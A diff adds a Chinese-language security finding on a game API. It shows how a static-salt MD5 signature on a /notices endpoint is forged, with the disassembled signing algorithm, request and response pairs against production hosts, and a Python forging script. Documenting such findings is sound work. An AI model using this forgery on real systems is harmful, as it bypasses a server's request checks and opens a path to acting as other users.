@@ -1,0 +1,112 @@
+## 目标与前置
+
+- 入口：`POST https://<HOST>:46750/notices`（JSON；等价入口另一台生产 accessurl）
+- 无需任何账号 / 凭据 / Cookie / 会话（本轮零 Cookie、未登录）
+- `Content-Type: application/json;charset=utf-8`
+- 固定出口 IP（代理 auto_off），单发不重放、请求间隔 ≥5s
+- IP 字面量主机需 `--noproxy '*'` 直连：走平台代理对该主机会 TLS 建链失败 rc=35
+
+## 签名算法（客户端反汇编所得，非猜测）
+
+来源：客户端 `GetNotices` 方法（RVA 0x315CD50）
+依次 `Concat('version'+v, 'token'+t, 'type'+Int32, 'userid'+Int64)` → `List.Sort`
+→ 拼盐字面量 `private_notices` → `GameUtils.GenerateMD5` → `String.ToUpper`。
+
+```
+参与签名字段 = version(string), token(string), type(int), userid(long)
+                  # gameid 为不参与签名的 string 字段
+signstr = join( k + value[k] for k in sorted(keys) ) + "private_notices"
+verify  = MD5(signstr).upper()      # 32 位大写十六进制
+```
+
+裸 key 拼裸 value：既无 `=`、无 `&`，字段之间也无分隔符。
+
+本次样本：
+
+```
+signstr = token123 + type1 + userid10000 + version1.0.0.9 + private_notices
+verify  = 71F92ABA6D7A935CCAADBB9AFE42E45E
+```
+
+## A/B 对照（唯一变量 = verify）
+
+### ① 错误签名（基线）
+
+```http
+POST /notices HTTP/1.1
+Host: <HOST>:46750
+Content-Type: application/json;charset=utf-8
+
+{"version":"1.0.0.9","token":"123","type":1,"userid":10000,"gameid":"","verify":"00000000000000000000000000000000"}
+```
+
+```
+HTTP/1.1 200 OK
+Content-Length: 39
+
+{"ret":1,"msg":"参数检查失败！"}
+```
+
+### ② 离线复算签名（命中签名层）
+
+同一 body，仅把 `verify` 换成 `71F92ABA6D7A935CCAADBB9AFE42E45E`：
+
+```
+HTTP/1.1 200 OK
+Content-Length: 39
+
+{"ret":2,"msg":"账号认证失败！"}
+```
+
+状态从「参数检查失败」→「账号认证失败」，说明服务端确实校验了签名、并接受了伪造值，
+请求已越过签名门进入账号/token 校验。卡住的是下一层：客户端默认字面量 `token=123` 被判无效。
+
+### ③ 第二台主机复测（排除单机偶发）
+
+对另一台生产 accessurl 直连（`--noproxy '*'`）：
+全零 verify → 200 / 39B / `ret=1`；复算 verify → 200 / 39B / `ret=2`。
+响应头：`Server: Microsoft-IIS`、`Content-Type: application/json;charset=utf-8`、
+`Access-Control-Allow-Origin: *`、`X-Frame-Options: sameorigin`。
+
+## 路由形态（证伪记录）
+
+| 请求 | 结果 | 解读 |
+|---|---|---|
+| `POST /notices` | 200 / JSON | 业务路由在根路径 |
+| `POST /v2/notices`（同 body） | 0 字节 / 20.02s / curl exit 28 | 路径不存在，静默丢弃；不是 WAF |
+| `GET /` | 403 / 134B 自定义 HTML | 根路径无业务面 |
+| `OPTIONS /` | 403 / 134B | 同上 |
+
+只有 `/notices`、`/userinfo` 这类白名单路由被转发到 JSON 处理器。
+
+## 为什么只判 low
+
+- 未取得任何 `data` 字段、未取得 token、无写操作；
+- 危害上限 = 签名层零防护：签名本身不是访问控制，它只是把攻击面推迟到 token 层；
+- 一旦从任何渠道（日志泄露、客户端内存、弱 token、其他接口）拿到任意有效 token，
+  即可用任意 `userid` 调用该批业务接口 —— 水平越权面直接打开。
+
+## 证伪条件
+
+- 任意 32 位随机 hex 也返回 `ret=2` → 响应差异与签名无关，结论不成立；
+- 正确 verify 与全零 verify 返回同一状态 → 不成立；
+- `/notices` 在到达签名校验前强制要求会话 Cookie → 不成立。
+
+## 复算脚本
+
+```python
+import hashlib, json
+
+def make_verify(payload: dict, salt="private_notices") -> str:
+    # gameid 等非签名字段不要传进来
+    signstr = "".join(f"{k}{payload[k]}" for k in sorted(payload)) + salt
+    print("signstr =", signstr)
+    return hashlib.md5(signstr.encode()).hexdigest().upper()
+
+body = {"version": "1.0.0.9", "token": "123", "type": 1, "userid": 10000}
+body["verify"] = make_verify(body)
+print(json.dumps(body, ensure_ascii=False))
+```
+
+> 同族机制参见知识库条目 `app-gateway-maintenance-static-salt-signature-forge`（/maintenance，盐 `private_maintenance`，7 字段，可拿到 `ret:0`）。
+> 本路由的盐为 `private_notices`，字段集合更少，且签名通过后停在 `ret:2`，**不能套用 /maintenance 的 ret:0 判据**。
